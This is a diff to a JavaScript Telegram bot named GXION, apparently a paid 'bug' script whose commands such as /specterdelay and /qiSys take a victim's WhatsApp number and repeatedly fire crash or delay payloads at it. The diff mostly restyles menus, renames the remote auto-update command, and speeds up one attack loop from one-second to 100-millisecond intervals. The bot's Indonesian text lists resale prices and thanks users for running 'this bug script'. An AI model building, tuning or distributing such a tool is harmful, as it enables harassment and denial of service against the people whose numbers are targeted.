@@ -1048,7 +1048,7 @@ function mainKeyboard() {
       { text: "👑𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url: "https://t.me/Bawzhhh", style: "danger" }
     ],
     [
-      { text: "📢𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈", callback_data: "info", style: "primary" }
+      { text: "📢𝐏𝐑𝐈𝐂𝐄 𝐒𝐂𝐑𝐈𝐏𝐓", callback_data: "info", style: "primary" }
     ]
   ];
 }
@@ -1083,13 +1083,13 @@ async function sendHome(ctx) {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
+╭═───⊱『 🪧𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
@@ -1111,21 +1111,14 @@ bot.action("xsettings", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
-◇ Stats Premium : ${premium ? "Yes" : "No"}
-◇ Stats Sender : ${sender ? "Yes" : "No"}
-◇ Runtime : ${runtime(process.uptime())}
-◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-
-╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
-
-◇ /update          
+╭═───⊱『 ⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+◇ /pullupdate          
 ◇ /connect
 ◇ /addprem
 ◇ /delprem
@@ -1158,24 +1151,18 @@ bot.action("xbugs", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
-◇ Stats Premium : ${premium ? "Yes" : "No"}
-◇ Stats Sender : ${sender ? "Yes" : "No"}
-◇ Runtime : ${runtime(process.uptime())}
-◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-
-╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        
+╭═───⊱『 🚀𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        
 ◇ /specterdelay - Delay No Kenon
 ◇ /delayworek - Delay Hard Worth ( Maybe )
 ◇ /EquarTerdelay - One Shoot Delay 
 ◇ /qiSys - Delay Hard Can Spam No Kenon
-╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
+╭═───⊱『 ✨𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /combox
 </pre>
 `;
@@ -1190,20 +1177,13 @@ bot.action("tools", async (ctx) => {
   const sender = isWhatsAppConnected;   
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
-◇ Stats Premium : ${premium ? "Yes" : "No"}
-◇ Stats Sender : ${sender ? "Yes" : "No"}
-◇ Runtime : ${runtime(process.uptime())}
-◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-
-╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡
-              
+╭═───⊱『 ⚙️𝐓𝐎𝐎𝐋𝐒 』───═⬡
 ◇ /brat
 ◇ /tiktokdl
 ◇ /convert
@@ -1231,20 +1211,13 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 1) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
-◇ Framework : Telegraf 
+◇ Framework : Telegraf
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
-◇ Stats Premium : ${premium ? "Yes" : "No"}
-◇ Stats Sender : ${sender ? "Yes" : "No"}
-◇ Runtime : ${runtime(process.uptime())}
-◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-
-╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡
-              
+╭═───⊱『 📢𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡           
 ◇40K FULL UP SCRIPT
 ◇50K RESELLER SCRIPT
 ◇60K PARTNER SCRIPT
@@ -1273,13 +1246,7 @@ async function showInfo(ctx, page = 1) {
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
-◇ Stats Premium : ${premium ? "Yes" : "No"}
-◇ Stats Sender : ${sender ? "Yes" : "No"}
-◇ Runtime : ${runtime(process.uptime())}
-◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
-
-╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
+╭═───⊱『 🦋𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
  olaa saya Bawzhhh ingin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
 </pre>
 `;
@@ -1333,7 +1300,7 @@ bot.action("run_update", async (ctx) => {
 });
 
 //------------------(AUTO - UPDATE SYSTEM)--------------------//
-bot.command("update", async (ctx) => doUpdate(ctx));
+bot.command("pullupdate", async (ctx) => doUpdate(ctx));
 
 const UPDATE_URL =
   "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";
@@ -2141,9 +2108,9 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
   await ctx.reply(`✅ specterdelay (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 40; r++) {
+    for (let r = 0; r < 30; r++) {
   await DelayHardNullVnX(sock, target);
-  await sleep(1000);
+  await sleep(100);
 }
   })();
 
@@ -2186,7 +2153,7 @@ bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ct
 /// CASE BUG BEBAS SPAM 4 ///
 bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`Example: /qiSys 62xxxx`);
+  if (!q) return ctx.reply(`🪧 Example: /qiSys 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
